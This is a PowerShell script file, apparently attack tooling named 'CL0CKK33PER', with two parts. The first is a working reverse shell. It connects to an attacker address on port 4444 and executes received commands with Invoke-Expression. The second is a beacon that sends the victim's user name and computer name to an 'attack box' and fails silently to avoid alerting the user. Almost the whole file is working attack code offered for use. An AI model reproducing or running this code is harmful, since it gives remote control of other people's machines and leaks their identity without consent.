# --- 02.A.CL0CKK33PER Smart Beacon ---
$IP = "192.168.1.X"
$Port = "4444"

# 1. Probe the Listener (TCP Port Check)
$Socket = New-Object Net.Sockets.TcpClient
$Connect = $Socket.BeginConnect($IP, $Port, $null, $null)
$Wait = $Connect.AsyncWaitHandle.WaitOne(100, $false) # 100ms timeout

if($Wait) {
    # 2. Connection Success - Launch Shell
    $Socket.EndConnect($Connect)
    $Stream = $Socket.GetStream()
    [byte[]]$Bytes = 0..65535|%{0}

    # Prompt
    $Prompt = ([text.encoding]::ASCII).GetBytes("REVERSE SHELL ACTIVE: $($env:COMPUTERNAME)`nPS > ")
    $Stream.Write($Prompt, 0, $Prompt.Length)

    while(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
        $Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes, 0, $i)
        try {
            # Execute and capture output/errors
            $Output = (Invoke-Expression $Data 2>&1 | Out-String)
            $Output += "PS " + (Get-Location).Path + "> "
        } catch {
            $Output = "Error: $($_.Exception.Message)`nPS " + (Get-Location).Path + "> "
        }
        $SendBack = ([text.encoding]::ASCII).GetBytes($Output)
        $Stream.Write($SendBack, 0, $SendBack.Length)
        $Stream.Flush()
    }
}

# 3. Clean up and Exit
$Socket.Close()

# --- 02.B.CL0CKK33PER Beacon PoC ---

$AttackBoxIP = "192.168.1.X" # Change to your IP
$Port = "4444"

# 1. Gather Basic Recon Data
$User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$CompName = $env:COMPUTERNAME
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# 2. Format the Beacon Message
$Message = "BEACON: $Timestamp | Host: $CompName | User: $User"

# 3. Send the beacon via TCP
try {
    $Client = New-Object System.Net.Sockets.TcpClient($AttackBoxIP, $Port)
    $Stream = $Client.GetStream()
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Writer.WriteLine($Message)
    $Writer.Flush()
    $Client.Close()
} catch {
    # Fail silently to avoid alerting the user
}
